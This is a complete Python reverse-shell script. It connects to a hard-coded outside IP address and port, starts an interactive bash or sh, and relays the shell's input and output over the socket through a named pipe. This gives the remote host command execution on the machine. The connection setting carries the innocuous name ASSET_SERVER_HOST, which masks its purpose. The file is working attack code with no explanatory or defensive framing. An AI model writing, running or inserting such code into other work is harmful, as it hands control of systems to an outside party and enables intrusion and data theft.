import os
import socket
import subprocess
import select
import time

# Configuration
ASSET_SERVER_HOST = "64.227.18.231"
ASSET_SERVER_PORT = 13370
FIFO_PATH = "/tmp/reverse_shell_fifo"

def main():
    # 1. Create the named pipe (FIFO)
    if os.path.exists(FIFO_PATH):
        os.remove(FIFO_PATH)
    os.mkfifo(FIFO_PATH)

    # 2. Connect to the remote server
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        print(f"Connecting to {ASSET_SERVER_HOST}:{ASSET_SERVER_PORT}...")
        sock.connect((ASSET_SERVER_HOST, ASSET_SERVER_PORT))
        print("Connection successful.")
    except Exception as e:
        print(f"Failed to connect: {e}")
        os.remove(FIFO_PATH)
        return

    # 3. Open the FIFO for reading and writing.
    # Open for reading in non-blocking mode.
    fifo_read = os.open(FIFO_PATH, os.O_RDONLY | os.O_NONBLOCK)
    # Open for writing. This will block until a reader opens it.
    fifo_write = os.open(FIFO_PATH, os.O_WRONLY)

    # 4. Launch the interactive shell as a subprocess
    shell = "/bin/bash" if os.path.exists("/bin/bash") else "/bin/sh"
    print(f"Launching shell: {shell}")
    # The shell's input will come from the read-end of our FIFO.
    # Its output and error will go to pipes we can read.
    process = subprocess.Popen(
        [shell, "-i"],
        stdin=fifo_read,
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )

    # We can now close the read-end of the fifo in the parent,
    # the child shell process still holds it open.
    os.close(fifo_read)

    print("Relaying streams... Press Ctrl+C in the controlling terminal to stop.")
    
    try:
        # 5. Main loop to relay data using select
        while True:
            # List of file descriptors to monitor for reading
            read_list = [sock, process.stdout, process.stderr]
            
            readable, _, _ = select.select(read_list, [], [])

            for fd in readable:
                if fd is sock:
                    # Data from remote server -> write to FIFO -> shell's stdin
                    data = sock.recv(1024)
                    if not data:
                        print("Remote connection closed.")
                        return
                    os.write(fifo_write, data)
                
                elif fd is process.stdout or fd is process.stderr:
                    # Data from shell's stdout/stderr -> send to remote server
                    data = os.read(fd.fileno(), 1024)
                    if not data:
                        print("Shell process exited.")
                        return
                    sock.sendall(data)

    except KeyboardInterrupt:
        print("\nInterrupted by user.")
    except Exception as e:
        print(f"\nAn error occurred: {e}")
    finally:
        # Cleanup
        print("Closing resources...")
        process.terminate()
        sock.close()
        os.close(fifo_write)
        if os.path.exists(FIFO_PATH):
            os.remove(FIFO_PATH)

if __name__ == "__main__":
    main()
